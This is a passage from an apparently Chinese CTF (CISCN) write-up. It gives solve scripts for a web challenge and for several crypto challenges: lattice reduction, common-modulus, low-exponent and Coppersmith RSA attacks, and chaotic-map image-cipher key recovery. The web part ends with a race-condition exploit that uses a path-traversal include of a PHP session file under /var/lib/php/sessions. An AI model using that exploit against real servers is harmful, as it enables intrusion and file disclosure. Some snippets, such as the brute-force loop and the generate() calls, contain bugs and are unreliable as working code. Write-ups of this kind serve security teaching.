class="string">&#x27;../../../../../var/lib/php/sessions/dhccbdgecg/sess_test&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=<span class="string">&quot;http://121.36.14.168:24395/&quot;</span>, data=data)</span><br><span class="line">        print(response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;string&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">session = requests.session()</span><br><span class="line">t1 = threading.Thread(target=t1, args=(session,))</span><br><span class="line">t1.daemon = <span class="literal">True</span></span><br><span class="line">t1.start()</span><br><span class="line">t2(session)</span><br></pre></td></tr></table></figure><p>正好套了五层……</p><blockquote><p>CISCN{5azpA-eCNJC-ctcXm-vJzDU-jXPBS-}</p></blockquote><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="move"><a href="#move" class="headerlink" title="move"></a>move</h2><p>首先根据题意$$ex-yn=y(p+q+1)-z$$</p><p>那么可以造出格子求出$$x,y$$</p><p>再二分法求$$s=p+q$$</p><p>与虎符杯密码第二题类似，参照该题解出。<a href="https://tearsjin.xyz/page/2/?fileGuid=cKDQRHCPv6VjxWKx">https://tearsjin.xyz/page/2/</a></p><p>有题意，$$a=0$$,带点可求$$b$$</p><p>求$$e在阶下的逆元$$</p><p>求$$G=dP$$</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">half_n=<span class="built_in">int</span>(sqrt(n))</span><br><span class="line">e=<span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">M=matrix([[half_n,e],</span><br><span class="line">[<span class="number">0</span>,-n]])</span><br><span class="line">L=M.LLL()[<span class="number">0</span>]</span><br><span class="line">mm=matrix([<span class="number">-235436912945336662391026124471105219395770217328162018931594609419582745114251948238840212881814533708592325776478635076056630520429862826686225762483017735282225173655229129488512828712599656980161312082481987496707036067942329100</span>,<span class="number">-406850608655407486298019095013146348847805975120061760929682791882948049742096195978800022454159691659865169100330308708576847735609146508679126419372034710027124703842712262177437006326228856546452636094881051757653949488135598409</span>])</span><br><span class="line">bound=<span class="built_in">int</span>(sqrt(<span class="number">2</span>*n))//<span class="number">12</span></span><br><span class="line">x,y=<span class="number">26279444166664821795077701675621823220865336004430428203703688888211697122228</span>,<span class="number">22131877391133483964429946329193825460775374851078084751208971056041193500203</span></span><br><span class="line"><span class="keyword">assert</span> x&lt;bound</span><br><span class="line"><span class="keyword">assert</span> y&lt;bound//x</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span>(<span class="params">K,N</span>):</span></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">r = K</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">515</span>):</span><br><span class="line">s = (l+r)//<span class="number">2</span></span><br><span class="line">v = s*s-<span class="built_in">int</span>(<span class="number">9</span>*s^<span class="number">2</span>*(K<span class="number">-1</span>-s)*(K<span class="number">-1</span>-s))//(<span class="built_in">round</span>(N^<span class="number">0.25</span>)*<span class="built_in">round</span>(N^<span class="number">0.25</span>))</span><br><span class="line"><span class="keyword">if</span> v&lt;<span class="number">4</span>*N:</span><br><span class="line">l=s</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r=s</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line">e=<span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">x,y=<span class="number">26279444166664821795077701675621823220865336004430428203703688888211697122228</span>,<span class="number">22131877391133483964429946329193825460775374851078084751208971056041193500203</span></span><br><span class="line">n=<span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">k=e*x-y*n</span><br><span class="line">K=k//y</span><br><span class="line">s=magic(K,n)</span><br><span class="line">print(s)</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s=Solver()</span><br><span class="line">p,q=Ints(<span class="string">&quot;p q&quot;</span>)</span><br><span class="line">s.add(p+q==<span class="number">18383013852155207284866834850624501649134164688503883162216824258842790032992437383933186349369945088653252318167911285710266631681220716855493349532603970</span>)</span><br><span class="line">s.add(p*q==<span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span>)</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">print(s.model())</span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421103469394495274706241578726021598690355239783781433785479293793926265140251884444575671410967573946453503486277025286699273827984004452338</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">p=<span class="number">7137110102022535123348664656689848983548191256934755709215236325084864398993149288243244941561397379979025441681860286823605147363784020425000696750337273</span></span><br><span class="line">q=<span class="number">11245903750132672161518170193934652665585973431569127453001587933757925633999288095689941407808547708674226876486050998886661484317436696430492652782266697</span></span><br><span class="line">phi=(p+<span class="number">1</span>)*(q+<span class="number">1</span>)</span><br><span class="line">x,y=<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span></span><br><span class="line">d=inverse_mod(e,phi)</span><br><span class="line">C=E([x,y])</span><br><span class="line">G=d*C</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">print(long_to_bytes(G[<span class="number">0</span>])+long_to_bytes(G[<span class="number">1</span>]))</span><br><span class="line"><span class="comment">#CISCN&#123;e91fef4ead7463b13d00bda65f540477&#125;</span></span><br></pre></td></tr></table></figure><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><p>送分题，低指数爆破，共模攻击，已知高位攻击，求出明文拼接后求md5.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="comment">#共模</span></span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">e2 =<span class="number">65537</span></span><br><span class="line">n =<span class="number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span></span><br><span class="line">c1 =<span class="number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line">c2 =<span class="number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line">_, r, s = gmpy2.gcdext(e1, e2)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, r, n) * <span class="built_in">pow</span>(c2, s, n) % n</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment">#爆破</span></span><br><span class="line">n=</span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">c=</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      a=iroot(c+k*n,<span class="number">3</span>)</span><br><span class="line">      <span class="keyword">if</span> a[<span class="number">1</span>]:</span><br><span class="line">          print(long_to_bytes(a[<span class="number">0</span>]))</span><br><span class="line"><span class="comment">#高位</span></span><br><span class="line">n =</span><br><span class="line">e =</span><br><span class="line">c =</span><br><span class="line">pbar =</span><br><span class="line">kbits =</span><br><span class="line">print(<span class="string">&quot;upper %d bits (of %d bits) is given&quot;</span> % (pbar.nbits()-kbits, pbar.nbits()))</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">p = x0 + pbar</span><br><span class="line">print(<span class="string">&quot;p:&quot;</span>, p)</span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line">d = inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(<span class="string">&quot;m:&quot;</span>, <span class="built_in">pow</span>(c, d, n))</span><br><span class="line">      </span><br></pre></td></tr></table></figure><h2 id="image"><a href="#image" class="headerlink" title="image"></a>image</h2><p>首先根据test数据可以求到key的四种可能性，由于有些元素求反导致，所以只需要将四个密钥两两组合爆破，根据加密代倒推ch，ch倒推seq，进而求x,r,爆破x0最终可以得到各个参数分别为：r=1.2</p><p>key1=169</p><p>key2=78</p><p>x0=0.840264</p><p>再解出image即可，需要注意的是，这里是py2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">testcipher=[<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line">testimage=[<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line">pos_key1=[x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(testcipher,testimage)]</span><br><span class="line">print(pos_key1)</span><br><span class="line">keys=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pos_key1:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> keys:</span><br><span class="line">        keys.append(i)</span><br><span class="line">print(keys)</span><br><span class="line">key1=<span class="number">169</span></span><br><span class="line">key2=<span class="number">78</span></span><br><span class="line">ch=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(testimage)):</span><br><span class="line">    <span class="keyword">if</span> (testimage[i]^key1==testcipher[i]):</span><br><span class="line">        ch+=<span class="string">&quot;0&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (~testimage[i]^key1==testcipher[i]):</span><br><span class="line">        ch+=<span class="string">&quot;1&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (testimage[i]^key2==testcipher[i]):</span><br><span class="line">        ch+=<span class="string">&quot;2&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (~testimage[i]^key2==testcipher[i]):</span><br><span class="line">        ch+=<span class="string">&quot;3&quot;</span></span><br><span class="line">        </span><br><span class="line">num=<span class="number">16</span>*<span class="number">16</span>//<span class="number">8</span></span><br><span class="line">seq=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ch)):</span><br><span class="line">    seq.append(<span class="built_in">bin</span>(<span class="built_in">int</span>(ch[i]))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">print(seq)</span><br><span class="line">seqs=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seq:</span><br><span class="line">    seqs.append(<span class="built_in">float</span>(i)/<span class="number">22000</span>)</span><br><span class="line">tmps=[<span class="built_in">round</span>(seq/<span class="number">22000</span>,<span class="number">6</span>) <span class="keyword">for</span> seq <span class="keyword">in</span> seqs]</span><br><span class="line"><span class="comment">#solve the x[0] and x0</span></span><br><span class="line">v=<span class="built_in">round</span>(tmps[<span class="number">0</span>],<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    tmpv=v<span class="number">-1000</span>*<span class="number">0.000001</span>+i*<span class="number">0.000001</span></span><br><span class="line">    Flag=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(seqs)):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(seqs[j]!=<span class="built_in">int</span>(tmpv*<span class="number">22000</span>)):</span><br><span class="line">            <span class="comment">#print(seqs[j],int(tmpv*22000))</span></span><br><span class="line">            Flag=<span class="literal">False</span></span><br><span class="line">        tmpv=generate(tmpv,r)</span><br><span class="line">    <span class="keyword">if</span> Flag:</span><br><span class="line">        print(<span class="string">&quot;found x[0]:&quot;</span>+<span class="built_in">str</span>(v<span class="number">-1000</span>*<span class="number">0.000001</span>+i*<span class="number">0.000001</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x),<span class="number">6</span>)</span><br><span class="line">c=[<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span 